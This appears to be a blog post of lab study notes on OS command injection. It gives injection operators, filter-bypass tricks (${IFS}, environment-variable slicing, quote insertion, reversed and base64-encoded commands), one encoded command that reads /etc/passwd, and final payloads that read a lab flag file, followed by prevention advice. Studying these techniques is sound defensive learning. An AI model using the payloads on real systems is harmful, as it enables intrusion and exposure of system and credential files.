---
layout: post
title: Command Injection
date: 2024-02-29 10:29 +0000
---
## Command Injection Methods

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                           |
| ------------------ | ------------------- | --------------------- | ------------------------------------------ |
| Semicolon          | ;                   | %3b                   | Both                                       |
| New Line           | \n                  | %0a                   | Both                                       |
| Background         | &                   | %26                   | Both (second output generally shown first) |
| Pipe               | \|                  | %7c                   | Both (only second output is shown)         |
| AND                | &&                  | %26%26                | Both (only if first succeeds)              |
| OR                 | \|\|                | %7c%7c                | Second (only if first fails)               |
| Sub-Shell          | ``                  | %60%60                | Both (Linux-only)                          |
| Sub-Shell          | $()                 | %24%28%29             | Both (Linux-only)                          |

## Bypass Spaces

Spaces is  a character commonly blacklisted, to bypass it we can use the following list provided by [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space).

Using tabs: `%0a%09whoami`
Using IFS: `%0a${IFS}whoami`
Using Brace Expansion: `%0a{ls,-la}`

## Bypassing Special Characters

There are multiple ways of bypassing special characters, including the common slash(`/`) and backslash(`\`).
One such technique we can use for replacing special characters is by using the **Linux Environment Variables** . We can specify a **start** and an **end** like: `echo ${PATH:0:1}` and this will get `/`. We can use other variables beside `PATH` like `HOME` or `PWD`.

`${IFS}` its the same as a space

Bypass `;` example: `127.0.0.1${LS_COLORS:10:1}${IFS}whoami`

In Windows we can use a similar technique: `echo %HOMEPATH:~6,-11%`
We can achieve the same in Powershell with: `$env:HOMEPATH[0]`

Another well known technique is called shifting characters. Basically we only need to find a character in ascii before the character we want to use and that is being filtered(`man ascii `). For example: `\` is on 92, before it is `[` on 91. We can then execute the following command: `echo $(tr '!-}' '"-~'<<<[)` to get `\`.

If we want `;` then `$(tr '!-}' '"-~'<<<:)`

If we want `|` then `$(tr '!-}' '"-~'<<<{)`

## Bypassing Blacklisted commands

Using quotes and double quotes:

```shell
w'h'o'am'i
w"h"o"am"i
```

Note: The number of quotes needs to be even

In Linux we can use: 

```shell
who$@ami
w\ho\am\i
```

In windows we can use:

```shell
who^ami
```

Final Payload: `ip=127.0.0.1${IFS}%0ac'at'${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt`

## Advanced Command Obfuscation

Case Manipulation(Windows): `WHOAMI` and `WhOaMi`
Case Manipulation(Linux): `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` and `$(a="WhOaMi";printf %s "${a,,}")`
Reversed Commands(Linux):
    - First get the reverse string: `echo 'whoami' | rev`
    - Then we can use: `$(rev<<<'imaohw')`
Reversed Commands(Windows):
    - First get the reverse string: `"whoami"[-1..-20] -join ''`
    - The we can use: `iex "$('imaohw'[-1..-20] -join '')"`
Encoded Commands:
    - We can use base 64(Linux): `echo -n 'cat /etc/passwd | base64` and `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
    - We can use base 64(Linux): `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` and `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
Other obfuscation techniques: [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion).


## Evasion Tools

If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques.
Tool for linux: [bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
Tool for windows: [DOSfunction](https://github.com/danielbohannon/Invoke-DOSfuscation)

## Prevention

- We should always avoid or limit the use of functions that execute system commands
- Whether using built-in functions or system command execution functions, we should always validate and then sanitize the user input. Input validation should be done both on the front-end and on the back-end.
- Server Configurations:
    - Use the web server's built-in Web Application Firewall (e.g., in Apache mod_security), in addition to an external WAF (e.g. Cloudflare, Fortinet, Imperva..)
    - Abide by the Principle of Least Privilege (PoLP) by running the web server as a low privileged user (e.g. www-data)
    - Prevent certain functions from being executed by the web server (e.g., in PHP disable_functions=system,...)
    - Limit the scope accessible by the web application to its folder (e.g. in PHP open_basedir = '/var/www/html')
    - Reject double-encoded requests and non-ASCII characters in URLs
    - Avoid the use of sensitive/outdated libraries and modules (e.g. PHP CGI)


Final Payload: `GET /index.php?to=%26%26${IFS}c'a't${IFS}${PATH:0:1}flag.txt&from=tmp${PATH:0:1}696212415.txt&finish=1&move=1 HTTP/1.1`
Since this is a move functionality the `to` parameter is the last argument of the `mv` command, so we insert our payload after it.